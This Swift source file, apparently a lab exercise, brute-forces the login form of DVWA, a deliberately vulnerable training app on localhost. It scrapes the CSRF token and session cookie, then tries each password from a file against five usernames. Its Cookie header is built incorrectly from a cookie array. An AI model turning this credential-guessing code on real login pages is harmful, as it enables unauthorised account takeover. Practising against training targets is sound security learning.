//
//  main.swift
//  BruteForceDVWA
//
//  Created by nastasya on 23.11.2024.
//

import Foundation

let baseURL = URL(string: "http://localhost")!
let bruteforceURL = URL(string: "http://localhost/vulnerabilities/brute/")!
let loginURL = URL(string: "http://localhost/login.php")!

let usernames = ["admin", "Gordon", "Hack", "Pablo", "Bob"]
let passwordFile = "passwords.txt"

func readPasswords() -> [String]? {
    let filePath = "/Users/nastasya/Developer/BruteForce-DVWA/BruteForceDVWA/passwords.txt"
    do {
        let content = try String(contentsOfFile: filePath)
        return content.components(separatedBy: .newlines).filter { !$0.isEmpty }
    } catch {
        print("Ошибка чтения файла: \(error)")
        return nil
    }
}

func setup(client: inout URLSession, completion: @escaping (String?, [HTTPCookie]?) -> Void) {
    var request = URLRequest(url: loginURL)
    request.httpMethod = "GET"
    request.setValue("Mozilla/5.0 (compatible)", forHTTPHeaderField: "User-Agent")
    
    let task = client.dataTask(with: request) { data, response, error in
        guard let data = data, error == nil else {
            print("Ошибка запроса:", error ?? "неизвестная ошибка")
            completion(nil, nil)
            return
        }
        
        if let html = String(data: data, encoding: .utf8) {
            let regex = try! NSRegularExpression(pattern: "<input\\s+type=['\"]hidden['\"]\\s+name=['\"]user_token['\"]\\s+value=['\"]([^'\"]+)['\"]\\s*/?>")
            let range = NSRange(location: 0, length: html.count)
            if let match = regex.firstMatch(in: html, options: [], range: range),
               let tokenRange = Range(match.range(at: 1), in: html) {
                let userToken = String(html[tokenRange])
                print("User Token: \(userToken)") // Выводим userToken
                
                if let httpResponse = response as? HTTPURLResponse,
                   let url = response?.url {
                    let cookies = HTTPCookie.cookies(withResponseHeaderFields: httpResponse.allHeaderFields as! [String: String], for: url)
                    if let phpSessionId = cookies.first(where: { $0.name == "PHPSESSID" }) {
                        print("PHPSESSID: \(phpSessionId.value)")
                    }
                    completion(userToken, cookies)
                } else {
                    completion(userToken, nil)
                }
            } else {
                completion(nil, nil)
            }
        } else {
            completion(nil, nil)
        }
    }
    
    task.resume()
}

func tryLogin(client: inout URLSession, userToken: String, phpSessionId: [HTTPCookie], username: String, password: String, completion: @escaping (Bool) -> Void) {
    var params = URLComponents(url: bruteforceURL, resolvingAgainstBaseURL: false)!
    params.queryItems = [
        URLQueryItem(name: "username", value: username),
        URLQueryItem(name: "password", value: password),
        URLQueryItem(name: "Login", value: "Login"),
        URLQueryItem(name: "user_token", value: userToken),
    ]
    
    var request = URLRequest(url: params.url!)
    request.httpMethod = "GET"
    request.setValue("Mozilla/5.0 (compatible)", forHTTPHeaderField: "User-Agent")

    request.setValue("PHPSESSID=\(phpSessionId); security=low", forHTTPHeaderField: "Cookie")
    
    let task = client.dataTask(with: request) { data, response, error in
        guard let data = data, error == nil else {
            print("Ошибка запроса:", error ?? "неизвестная ошибка")
            completion(false)
            return
        }
        
        if let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 302 {
            print("Редирект (302) после попытки входа с паролем \(password)")
            completion(false)
        } else if let html = String(data: data, encoding: .utf8), html.contains("Welcome") {
            completion(true)
        } else {
            completion(false)
        }
    }
    
    task.resume()
}

func main() {
    let config = URLSessionConfiguration.default
    config.httpShouldSetCookies = true
    config.httpCookieAcceptPolicy = .always
    config.httpShouldUsePipelining = true
    
    var session = URLSession(configuration: config)
    
    let group = DispatchGroup()
    
    setup(client: &session) { userToken, phpSessionId in
        guard let userToken = userToken, let phpSessionId = phpSessionId else {
            print("Не удалось получить user_token или PHPSESSID")
            return
        }
        
        guard let passwords = readPasswords() else {
            return
        }
        
        for password in passwords {
            for username in usernames {
                group.enter()
                
                tryLogin(client: &session, userToken: userToken, phpSessionId: phpSessionId, username: username, password: password) { success in
                    if success {
                        print("Пароль для пользователя \(username) найден: \(password)")
                    } else {
                        print("Неправильный пароль для пользователя \(username): \(password)")
                    }
                    group.leave()
                }
            }
        }
        
        group.notify(queue: .main) {
            print("Все попытки завершены.")
        }
    }
}

main()

RunLoop.main.run()
